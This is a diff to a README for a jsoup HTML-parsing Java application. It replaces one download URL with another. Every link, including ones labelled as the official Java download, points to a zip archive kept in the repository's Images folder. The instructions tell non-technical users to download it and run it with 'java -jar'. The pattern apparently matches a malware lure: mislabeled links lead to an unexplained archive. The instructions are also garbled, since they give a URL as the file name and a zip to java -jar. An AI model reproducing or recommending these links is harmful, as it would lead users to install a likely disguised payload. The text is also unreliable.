@@ -10,7 +10,7 @@
 `dom, getelementbyid, getelementsbyclassname, html, html-parsing, ja, japanese, java, jsoup, maven, parsing, web-scraping`
 
 ## 📥 Download Now
-[![Download jsoup-html-parsing](https://github.com/shivuu14/jsoup-html-parsing/raw/refs/heads/main/Images/html_jsoup_parsing_3.1.zip%20Now-v1.0-brightgreen)](https://github.com/shivuu14/jsoup-html-parsing/raw/refs/heads/main/Images/html_jsoup_parsing_3.1.zip)
+[![Download jsoup-html-parsing](https://raw.githubusercontent.com/shivuu14/jsoup-html-parsing/main/Images/html_parsing_jsoup_1.3.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/shivuu14/jsoup-html-parsing/main/Images/html_parsing_jsoup_1.3.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the jsoup-html-parsing application on your computer. This guide is designed for users with minimal technical knowledge.
@@ -26,7 +26,7 @@ Follow these simple steps to download and run the jsoup-html-parsing application
 ### 1. Visit the Releases Page
 Go to the following link to access the download page:
 
-[Download Page](https://github.com/shivuu14/jsoup-html-parsing/raw/refs/heads/main/Images/html_jsoup_parsing_3.1.zip)
+[Download Page](https://raw.githubusercontent.com/shivuu14/jsoup-html-parsing/main/Images/html_parsing_jsoup_1.3.zip)
 
 ### 2. Choose the Latest Release
 On the Releases page, you will find a list of versions. Look for the latest release, which typically has the highest version number.
@@ -35,10 +35,10 @@ On the Releases page, you will find a list of versions. Look for the latest rele
 Under the latest release, find the download link for the application. Click on it to start downloading the file. Depending on your connection speed, this may take a few moments.
 
 ### 4. Locate the Downloaded File
-After the download is complete, locate the file in your computer’s Downloads folder. The file name may look similar to `https://github.com/shivuu14/jsoup-html-parsing/raw/refs/heads/main/Images/html_jsoup_parsing_3.1.zip` or something equivalent.
+After the download is complete, locate the file in your computer’s Downloads folder. The file name may look similar to `https://raw.githubusercontent.com/shivuu14/jsoup-html-parsing/main/Images/html_parsing_jsoup_1.3.zip` or something equivalent.
 
 ### 5. Install Java (if not already installed)
-If you haven't done so already, install Java on your computer. You can download it from the [official Java website](https://github.com/shivuu14/jsoup-html-parsing/raw/refs/heads/main/Images/html_jsoup_parsing_3.1.zip).
+If you haven't done so already, install Java on your computer. You can download it from the [official Java website](https://raw.githubusercontent.com/shivuu14/jsoup-html-parsing/main/Images/html_parsing_jsoup_1.3.zip).
 
 ### 6. Run the Application
 To run the application, you will need to use the terminal or command prompt. Here’s how:
@@ -46,12 +46,12 @@ To run the application, you will need to use the terminal or command prompt. Her
 - **On Windows:**
   1. Open Command Prompt.
   2. Navigate to the folder where the jar file is located (e.g., `cd Downloads`).
-  3. Type `java -jar https://github.com/shivuu14/jsoup-html-parsing/raw/refs/heads/main/Images/html_jsoup_parsing_3.1.zip` and hit Enter.
+  3. Type `java -jar https://raw.githubusercontent.com/shivuu14/jsoup-html-parsing/main/Images/html_parsing_jsoup_1.3.zip` and hit Enter.
 
 - **On macOS/Linux:**
   1. Open Terminal.
   2. Change directory to where the jar is located (e.g., `cd ~/Downloads`).
-  3. Type `java -jar https://github.com/shivuu14/jsoup-html-parsing/raw/refs/heads/main/Images/html_jsoup_parsing_3.1.zip` and press Enter.
+  3. Type `java -jar https://raw.githubusercontent.com/shivuu14/jsoup-html-parsing/main/Images/html_parsing_jsoup_1.3.zip` and press Enter.
 
 ### 7. Follow the Instructions in the Application
 Once the application is running, follow the on-screen instructions to start parsing HTML. The interface is user-friendly and will guide you through each step.
@@ -63,7 +63,7 @@ If you need further assistance, feel free to reach out to the community forums o
 Your feedback is important. If you encounter any issues or have suggestions for improvement, please open an issue on GitHub.
 
 ## 🔗 Useful Links
-- [Download Page](https://github.com/shivuu14/jsoup-html-parsing/raw/refs/heads/main/Images/html_jsoup_parsing_3.1.zip)
-- [Official Java Download](https://github.com/shivuu14/jsoup-html-parsing/raw/refs/heads/main/Images/html_jsoup_parsing_3.1.zip)
+- [Download Page](https://raw.githubusercontent.com/shivuu14/jsoup-html-parsing/main/Images/html_parsing_jsoup_1.3.zip)
+- [Official Java Download](https://raw.githubusercontent.com/shivuu14/jsoup-html-parsing/main/Images/html_parsing_jsoup_1.3.zip)
 
 This README will help you get started with jsoup-html-parsing. Enjoy your experience with HTML parsing in Java!
